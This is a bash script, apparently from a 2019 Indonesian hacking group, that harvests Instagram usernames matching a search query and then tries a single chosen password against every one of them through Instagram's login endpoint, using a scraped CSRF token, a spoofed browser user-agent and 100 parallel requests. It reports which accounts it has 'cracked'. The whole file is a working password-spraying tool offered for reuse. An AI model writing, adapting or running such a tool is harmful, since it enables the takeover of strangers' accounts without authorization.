#!/bin/bash
#author         : ./Lolz
#release        : Jum'at 5 juli 2k19
#visit          : https://noolep.net
#thanks to      : JavaGhost - Bashid.org - 407AEX
#recode tinggal recode aja okeh?, tapi cantumin source Y tolol h3h3

#color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

#connections
#wget -q --tries=10 --timeout=20 --spider http://google.com
#echo "test your internet connections..."
#if [[ $? -eq 0 ]]; then
#        echo -e "status [${yellow}200 OK${white}]\nplease wait..."
#        sleep 2
#        ckear
#else
#        echo "internet connections not found"
#        exit
#fi

#dependencies
dependencies=( "jq" "curl" )
for i in "${dependencies[@]}"
do
    command -v $i >/dev/null 2>&1 || {
        echo >&2 "$i : not installed - install by typing the command : apt install $i -y";
        exit 1;
    }
done

#banner
echo -e $'''
                _  __       _ 
__     | _|_ o |_)|_     o (_|
||||_| |  |_ | |_)|  ___ | __|
\e[1;31mcontact: https://fb.me/n00b.me\e[1;37m
'''

#asking
read -p $'[\e[1;34m?\e[1;37m] search by query: ' ask
collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
echo $'[\e[1;34m*\e[1;37m] just found: '$collect''$(< target wc -l ; echo "user")
read -p $'[\e[1;34m?\e[1;37m] password to use: ' pass
echo "Start cracking..."

#start_brute
token=$(curl -s -L -i "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
function brute(){
    url=$(curl -s -X POST "https://www.instagram.com/accounts/login/ajax/" \
            -H "cookie: csrftoken=${token}" \
            -H "origin: https://www.instagram.com" \
            -H "referer: https://www.instagram.com/accounts/login/" \
            -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win32; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" \
            -H "x-csrftoken: ${token}" \
            -H "x-requested-with: XMLHttpRequest" \
            -d "username=${i}&password=${pass}&intent")
            login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
            if [[ $login =~ "true" ]]; then
                    echo -e "[${green}+${white}] ${yellow}get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
                elif [[ $login =~ "false" ]]; then
                            echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
                    elif [[ $url =~ "checkpoint_required" ]]; then
                            echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"

            fi
}

#thread
(
    for i in $(cat target); do
        ((thread=thread%100)); ((thread++==0)) && wait
        brute "$i" &
    done
    wait
)

rm target
